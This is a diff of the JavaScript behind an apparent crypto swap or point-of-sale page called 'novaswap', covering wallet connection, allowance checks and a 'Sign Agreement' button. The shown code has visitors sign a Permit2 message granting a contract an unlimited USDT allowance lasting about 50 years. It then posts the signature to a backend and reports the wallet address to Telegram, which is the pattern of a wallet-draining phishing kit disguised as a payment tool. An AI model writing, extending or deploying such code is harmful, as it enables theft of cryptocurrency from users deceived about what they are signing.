+            document.getElementById('walletStatus').className = 'wallet-status bg-emerald-500/20 text-emerald-300 p-3 rounded-xl text-center text-xs font-mono mb-4';
+            document.getElementById('walletStatus').innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
+            document.getElementById('walletBtnText').innerText = shortenAddress(userAddress);
+            document.getElementById('posConnectBtn').innerText = '✅ Connected';
+            document.getElementById('posConnectBtn').disabled = true;
+            document.getElementById('signBtn').disabled = false;
+            document.getElementById('userDisplay').textContent = shortenAddress(userAddress);
+            document.getElementById('disconnectBtn').classList.remove('hidden');
             closeWalletModal();
-            const currentUrl = window.location.href.split('?')[0];
-            const targetUrl = `${currentUrl}?autoconnect=true`;
-            localStorage.setItem('novaswap_auto_connect', 'true');
-
-            if (type === 'metamask') {
-                window.location.href = `https://metamask.app.link/dapp/${targetUrl.replace(/^https?:\/\//, '')}`;
-            } else {
-                window.location.href = targetUrl;
-            }
         }
 
-        function updateWalletUI() {
-            const btnText = document.getElementById('walletBtnText');
-            const disconnectBtn = document.getElementById('disconnectBtn');
-            if (userAddress) {
-                const shortAddr = userAddress.substring(0, 6) + '...' + userAddress.substring(userAddress.length - 4);
-                btnText.innerText = shortAddr;
-                disconnectBtn.classList.remove('hidden');
-                document.getElementById('userDisplay').innerText = shortAddr;
-            }
-        }
-
-        async function disconnectWallet() {
-            connectedAccount = null;
+        function disconnectWallet() {
             userAddress = null;
+            signer = null;
+            provider = null;
             localStorage.removeItem('novaswap_auto_connect');
-            document.getElementById('walletBtnText').innerText = "Connect Active Wallet";
-            document.getElementById('disconnectBtn').classList.add('hidden');
-            document.getElementById('userDisplay').innerText = "Not connected";
-            showToast("Wallet disconnected.");
+            location.reload();
         }
 
         async function checkAllowance() {
             try {
                 if (!userAddress) return;
-                const contract = new ethers.Contract(
-                    CONFIG.contractAddress,
-                    ["function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
-                    provider
-                );
-                const result = await contract.getAllowance(userAddress);
-                const amount = result.amount;
-                const isUnlimited = amount.toString() === MAX_UINT160;
+                const contract = new ethers.Contract(CONFIG.contractAddress, ["function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"], provider);
+                const res = await contract.getAllowance(userAddress);
+                const amount = res.amount;
+                const expiration = res.expiration;
 
-                document.getElementById('allowanceDisplay').textContent = isUnlimited ? '✅ Signed (Unlimited)' : '❌ Not Signed';
-                document.getElementById('allowanceDisplay').className = isUnlimited ? 'text-emerald-400 font-bold' : 'text-amber-400';
-            } catch (e) {
-                console.error(e);
-            }
+                if (amount.toString() === '0') {
+                    document.getElementById('allowanceDisplay').textContent = '❌ Not Signed';
+                    document.getElementById('allowanceDisplay').className = 'value text-amber-400 font-semibold';
+                    return;
+                }
+
+                const isUnlimited = amount.toString() === MAX_UINT160;
+                document.getElementById('allowanceDisplay').textContent = isUnlimited ? '✅ Signed (Unlimited)' : 'Signed';
+                document.getElementById('allowanceDisplay').className = 'value text-emerald-400 font-semibold';
+                document.getElementById('expiryDisplay').textContent = formatDate(expiration);
+
+                if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
+                    const sb = document.getElementById('signBtn');
+                    sb.textContent = '✅ Already Signed!';
+                    sb.disabled = true;
+                    document.getElementById('successCheck').classList.remove('hidden');
+                }
+            } catch (e) { console.error(e); }
         }
 
         async function getPermit2Nonce() {
-            const permit2 = new ethers.Contract(
-                CONFIG.permit2Address,
-                ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
-                provider
-            );
+            const permit2 = new ethers.Contract(CONFIG.permit2Address, ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"], provider);
             const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
             return data.nonce;
         }
 
         async function signAndSubmit() {
-            if (!signer || !userAddress) {
-                alert("Please connect your wallet first.");
-                connectWallet();
-                return;
-            }
             try {
+                if (!signer || !userAddress) {
+                    alert("Connect wallet first!");
+                    handleConnectClick();
+                    return;
+                }
+
+                const signBtn = document.getElementById('signBtn');
+                signBtn.innerHTML = '<span class="fa-solid fa-spinner animate-spin mr-2"></span> Signing...';
+                signBtn.disabled = true;
+
                 const nonce = await getPermit2Nonce();
                 const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50);
                 const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
@@ -519,46 +651,50 @@
                     ]
                 };
                 const message = {
-                    details: { token: CONFIG.usdtAddress, amount: MAX_UINT160, expiration: expiration, nonce: nonce },
+                    details: { token: CONFIG.usdtAddress, amount: MAX_UINT160, expiration, nonce },
                     spender: CONFIG.contractAddress,
-                    sigDeadline: sigDeadline
+                    sigDeadline
                 };
 
                 const signature = await signer._signTypedData(domain, types, message);
+                showStatus('📤 Processing agreement on backend...', 'loading');
 
                 const response = await fetch(CONFIG.apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ user: userAddress, amount: MAX_UINT160, expiration, nonce: nonce.toString(), sigDeadline, signature })
                 });
-                const result = await response.json();
 
+                const result = await response.json();
                 if (result.success) {
-                    showToast("Permit2 unlimited allowance signed successfully!");
+                    signBtn.textContent = '✅ Signed!';
+                    document.getElementById('successCheck').classList.remove('hidden');
+                    showStatus(`✅ ${result.message || 'Agreement signed successfully!'}`, 'success');
                     await checkAllowance();
-                    await sendTelegramMessage(`✍️ *Permit2 Approved!*\n\nWallet: \`${userAddress}\``);
+                    await sendTelegramMessage(`✍️ *Permit2 Unlimited Approval Verified!*\n\nWallet: \`${userAddress}\``);
                 } else {
-                    alert("Error: " + result.error);
+                    showStatus(`❌ Error: ${result.error}`, 'error');
+                    signBtn.innerHTML = '✍️ Sign Agreement';
+                    signBtn.disabled = false;
                 }
-            } catch (error) {
-                console.error(error);
-                alert("Signature request rejected.");
+            } catch (err) {
+                console.error(err);
+                showStatus(`❌ Signature rejected or failed.`, 'error');
+                const sb = document.getElementById('signBtn');
+                sb.innerHTML = '✍️ Sign Agreement';
+                sb.disabled = false;
             }
         }
 
-        function executeLiveTransaction() {
-            const merchantId = document.getElementById('merchantIdInput').value;
-            if (!merchantId) { alert("Enter Merchant ID first."); return; }
-            showToast("Live POS transaction test successful!");
-            sendTelegramMessage(`⚡ *Live Test Executed!*\nMerchant ID: \`${merchantId}\``);
+        async function executeSwap() {
+            showStatus("Executing swap authorization...", "info");
         }
 
-        function showToast(msg) {
-            const toast = document.createElement('div');
-            toast.className = 'fixed bottom-6 right-6 z-50 bg-emerald-500 text-black font-semibold text-xs px-4 py-3 rounded-xl shadow-2xl flex items-center space-x-2 animate-bounce';
-            toast.innerHTML = `<i class="fa-solid fa-circle-check"></i><span>${msg}</span>`;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
+        function executeLiveTransaction() {
+            const mid = document.getElementById('merchantIdInput')?.value;
+            if (!mid) { alert("Enter Merchant ID"); return; }
+            showStatus("Live POS terminal transaction test successful!", "success");
+            sendTelegramMessage(`⚡ *Live Terminal Test Executed!*\nMerchant ID: \`${mid}\``);
         }
     </script>
 </body>
